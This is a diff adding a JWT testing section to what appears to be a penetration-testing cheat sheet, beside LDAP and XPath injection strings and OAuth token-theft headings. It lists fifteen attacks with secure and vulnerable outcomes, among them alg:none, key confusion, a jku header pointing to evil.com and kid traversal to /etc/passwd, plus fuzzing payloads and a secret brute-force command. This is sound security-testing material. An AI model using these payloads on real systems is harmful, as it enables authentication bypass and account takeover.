@@ -3524,8 +3524,266 @@ query = "(&(uid=*)(uid=*)) (|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==)
 admin*)((|userPassword=*)
 x' or name()='username' or 'x'='y
 ```
+**1. Signature Tampering**  
+Modify claims without updating the signature.
+
+`json`  
+Payload:  
+```json
+{
+  "user": "admin",
+  "role": "admin"
+}
+```  
+✅ Expected: Signature checked and token rejected  
+❌ Vulnerable: Tampered token accepted
+
 ---
 
+**2. alg: none Bypass**  
+Remove signature and set algorithm to `none`.
+
+`json`  
+Header:  
+```json
+{
+  "alg": "none",
+  "typ": "JWT"
+}
+```  
+Payload:  
+```json
+{
+  "user": "admin"
+}
+```  
+✅ Expected: Server rejects token without signature  
+❌ Vulnerable: Token accepted as-is
+
+---
+
+**3. RS256 to HS256 Key Confusion**  
+Switch to `HS256` and use public key as HMAC secret.
+
+`json`  
+Header:  
+```json
+{
+  "alg": "HS256",
+  "typ": "JWT"
+}
+```  
+✅ Expected: Server rejects signature mismatch  
+❌ Vulnerable: Token accepted with public key as secret
+
+---
+
+**4. JWKS Injection via jku Header**  
+Point `jku` to attacker-controlled endpoint.
+
+`json`  
+Header:  
+```json
+{
+  "alg": "RS256",
+  "jku": "https://evil.com/jwks.json"
+}
+```  
+✅ Expected: Server validates JWKS source  
+❌ Vulnerable: JWKS fetched from attacker endpoint
+
+---
+
+**5. Embedded JWK (CVE-2018-0114)**  
+Inject public key directly in JWT header.
+
+`json`  
+Header:  
+```json
+{
+  "alg": "RS256",
+  "jwk": {
+    "kty": "RSA",
+    "kid": "evil",
+    "n": "<modulus>",
+    "e": "AQAB"
+  }
+}
+```  
+✅ Expected: Embedded key rejected  
+❌ Vulnerable: Signature verified using attacker key
+
+---
+
+**6. Expiration (exp) Manipulation**  
+Extend or remove expiration claim.
+
+`json`  
+Payload:  
+```json
+{
+  "user": "admin",
+  "exp": 9999999999
+}
+```  
+✅ Expected: Server validates `exp`  
+❌ Vulnerable: Token accepted indefinitely
+
+---
+
+**7. Audience (aud) & Issuer (iss) Abuse**  
+Modify `aud` or `iss` to bypass validation.
+
+`json`  
+Payload:  
+```json
+{
+  "user": "admin",
+  "aud": "trusted-client",
+  "iss": "evil.com"
+}
+```  
+✅ Expected: Claims checked against known values  
+❌ Vulnerable: Token accepted with spoofed claims
+
+---
+
+**8. HMAC Secret Brute-Force**  
+Use dictionary attack on HMAC secret.
+
+Command:  
+```bash
+python3 jwt_tool.py -t <token> -M brute
+```  
+✅ Expected: Strong secret key  
+❌ Vulnerable: Secret guessed via brute force
+
+---
+
+**9. Verbose Error Disclosure**  
+Trigger invalid JWTs and inspect errors.
+
+`json`  
+Payload:  
+```json
+INVALID.JWT.TOKEN
+```  
+✅ Expected: Generic error shown  
+❌ Vulnerable: Parser or validation errors disclosed
+
+---
+
+**10. Token Replay**  
+Reuse a valid but expired/revoked token.
+
+✅ Expected: Token rejected due to TTL or revocation  
+❌ Vulnerable: Replay accepted without freshness check
+
+---
+
+**11. kid Header Injection**  
+Inject directory traversal paths via `kid`.
+
+`json`  
+Header:  
+```json
+{
+  "kid": "../../../../../etc/passwd",
+  "alg": "RS256"
+}
+```  
+✅ Expected: Path sanitized or ignored  
+❌ Vulnerable: Path used in key lookup
+
+---
+
+**12. Claim Escalation**  
+Add high-privilege claims manually.
+
+`json`  
+Payload:  
+```json
+{
+  "user": "guest",
+  "role": "admin",
+  "isAdmin": true
+}
+```  
+✅ Expected: Role validated server-side  
+❌ Vulnerable: Role accepted without verification
+
+---
+
+**13. Type Confusion**  
+Use incorrect types for claims.
+
+`json`  
+Payload:  
+```json
+{
+  "exp": "not-a-timestamp"
+}
+```  
+✅ Expected: Type checked and rejected  
+❌ Vulnerable: Bypass due to loose parsing
+
+---
+
+**14. Header Pollution**  
+Include duplicate or malformed header keys.
+
+`json`  
+Header:  
+```json
+{
+  "alg": "RS256",
+  "alg": "none"
+}
+```  
+✅ Expected: Header cleaned or rejected  
+❌ Vulnerable: Parser confusion leading to bypass
+
+---
+
+**15. Psychic Signature (CVE-2022-21449)**  
+Use invalid ECDSA signatures that Java may accept.
+
+✅ Expected: Server rejects invalid EC signatures  
+❌ Vulnerable: Signature accepted due to Java bug
+
+### 🧩 **JWT Parameters to Fuzz (One Per Line)**
+
+```text
+token
+jwt
+access_token
+id_token
+auth_token
+bearer
+session
+credentials
+assertion
+authorization
+jwt_token
+jwt_assertion
+jwt_bearer
+jwt_auth
+jwt_session
+```
+
+---
+
+### 🎯 **Fuzzing Payloads (One Per Line)**
+
+```json
+{"alg":"none","typ":"JWT"}
+{"alg":"RS256","jku":"http://127.0.0.1:8080/jwks.json"}
+{"alg":"RS256","jwk":{"kty":"RSA","kid":"evil","n":"<modulus>","e":"AQAB"}}
+{"role":"admin","isAdmin":true}
+{"exp":9999999999}
+{"exp":"not-a-timestamp"}
+{"kid":"../../../../etc/passwd"}
+```
 ## OAuth Exploitation
 - Stealing OAuth Token via Referer
 - Grabbing OAuth Token via `redirect_uri`
